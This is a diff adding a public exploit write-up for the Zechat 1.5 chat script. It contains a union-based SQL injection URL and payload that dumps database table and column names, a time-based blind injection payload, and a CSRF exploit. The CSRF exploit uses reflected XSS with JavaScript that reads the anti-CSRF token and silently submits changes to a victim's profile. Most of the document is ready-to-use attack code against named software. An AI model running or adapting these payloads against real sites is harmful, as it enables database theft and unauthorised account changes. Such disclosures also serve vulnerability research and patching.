@@ -1,0 +1,87 @@
+# Exploit Title: Zechat 1.5 - 'hashtag' / 'v' SQL Injection / Cross site request forgery
+# Date: 2018-05-22
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage: https://bylancer.com
+# Version: 1.5
+# Tested on: Kali linux
+====================================================
+# POC 1 : SQLi :
+
+Parameter : hashtag
+    type : Union based
+
+http://test.com/chat/hashtag?hashtag=[SQL]
+
+# test :
+http://test.com/chat/hashtag?hashtag=-1%27%20UNION%20SELECT%20NULL,unhex(hex(group_concat(table_name,0x3C62723E,column_name))),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20from%20information_schema.columns%20where%20table_schema=schema()%23
+
+# Payload : -1' UNION SELECT
+NULL,unhex(hex(group_concat(table_name,0x3C62723E,column_name))),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+from information_schema.columns where table_schema=schema()%23
+
+====================================================
+
+Parameter : v
+    type : time-based blind
+
+test.com/chat/me?action=edit&v=[SQL]
+
+# test : test.com/chat/me?action=edit&v=231 AND sleep(10)%23
+
+# Payload : AND sleep(10)%23
+
+====================================================
+
+# POC 2 : CSRF :
+
+# CSRF vulnerability allows attacker to change user's information.
+In this script we have anti-csrf which we can't change user's information
+without token.
+So we use 'hashtag' parameter to set our encoded payload and bypass csrf
+protection : chat/hashtag?hashtag=[We have Reflected XSS here]
+
+# Exploit :
+
+  <form action="http://test.com/chat/data_settings.php" method="POST">
+      <input type="hidden" name="csrf&#95;token" value="" />
+      <input type="hidden" name="Wall"
+value="Hello&#32;would&#32;you&#32;like&#32;to&#32;be&#32;my&#32;friend" />
+      <input type="hidden" name="user" value="lord225" />
+      <input type="hidden" name="name" value="test" />
+      <input type="hidden" name="mail"
+value="d3code&#46;n&#64;gmail&#46;com" />
+      <input type="hidden" name="website" value="test" />
+      <input type="hidden" name="sex" value="male" />
+      <input type="hidden" name="country"
+value="&#45;&#45;&#45;&#45;&#45;&#45;" />
+      <input type="hidden" name="day" value="" />
+      <input type="hidden" name="month" value="" />
+      <input type="hidden" name="year" value="" />
+      <input type="hidden" name="Language" value="en" />
+    </form>
+
+    <script>
+
+var token = '';
+  var req = new XMLHttpRequest();
+  req.onreadystatechange = function(){
+    if(this.readyState == 4 && this.status == 200){
+
+          var setPage = this.responseXML;
+          token = setPage.forms[1].elements[0].value; // get token
+          console.log(token);
+         }
+
+  }
+      req.open("POST","/chat/settings",true);
+
+req.setRequestHeader("content-type","application/x-www-form-urlencoded");
+      req.responseType = "document";
+      req.send();
+
+      document.forms[0].elements[0].value = token; // set token to our form
+      document.forms[0].submit();
+
+</script>
+
+=====================================================
